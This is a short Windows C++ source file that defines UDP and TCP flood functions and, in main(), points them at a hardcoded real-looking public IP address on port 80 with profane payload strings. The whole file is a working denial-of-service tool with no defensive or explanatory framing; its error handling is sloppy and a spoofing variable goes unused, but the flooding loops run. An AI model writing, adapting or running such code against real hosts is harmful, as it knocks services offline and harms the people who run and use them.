#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int UDP_flood(char * flood_str,unsigned int times,sockaddr_in &DestAddr){
	int ErrorCode=0;
	SOCKET sock;
	WSADATA wsaData;
	ErrorCode=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(ErrorCode!=0){
		fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);
		return 0;
	}
	sock=socket(AF_INET,SOCK_DGRAM,0);
	//connect(sock,(sockaddr*)&DestAddr,sizeof(DestAddr));
	for(int i=0;i<times;i++){
		ErrorCode=sendto(sock,flood_str,strlen(flood_str),0,(sockaddr*)&DestAddr,sizeof(DestAddr));
		if(ErrorCode==SOCKET_ERROR){
			printf("Fail");
		}
	}
	closesocket(sock);
	WSACleanup();
	printf("UDP_Flood_Finished\n");
}
int TCP_flood(char * flood_str,unsigned int times,sockaddr_in &DestAddr){
	int ErrorCode=0;
	SOCKET sock;
	WSADATA wsaData;
	ErrorCode=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(ErrorCode!=0){
		fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);
		return 0;
	}
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	//#define WM_CUSTOM_NETWORK_MSG (WM_USER + 100)  
	for(int i=0;i<times;i++){
		//WSAAsyncSelect(sock, NULL, WM_CUSTOM_NETWORK_MSG, FD_CONNECT); //将连接设置为非阻塞 
		connect(sock,(sockaddr*)&DestAddr,sizeof(DestAddr));
		if(ErrorCode==SOCKET_ERROR){
			printf("Fail");
		}
		ErrorCode=send(sock,flood_str,strlen(flood_str),0);
		closesocket(sock);
		sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	}
	WSACleanup();
	printf("TCP_Flood_Finished\n");
}
int main(){
	char * FAKE_IP="10.82.38.44";
	char * SYN_DEST_IP="202.113.18.210";
	struct sockaddr_in DestAddr;
	memset(&DestAddr,0,sizeof(DestAddr));
	DestAddr.sin_family=AF_INET;
	DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);
	DestAddr.sin_port=htons(80);

	UDP_flood("FuckYourMom!!!",100,DestAddr);
	TCP_flood("FuckYourDad!!!",10,DestAddr);
	system("PAUSE");
}